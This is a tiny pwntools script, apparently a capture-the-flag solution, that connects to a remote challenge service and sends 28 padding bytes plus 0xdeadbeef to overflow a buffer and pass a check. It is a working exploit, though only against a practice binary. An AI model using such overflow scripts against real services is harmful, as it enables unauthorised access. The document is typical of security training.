from pwn import *

ip = "140.110.112.77"
port = 6125

context.arch = "amd64"

r = remote(ip, port)
# r = process("./pass")

r.sendlineafter("?", flat("a" * 28, 0xdeadbeef))

r.interactive()
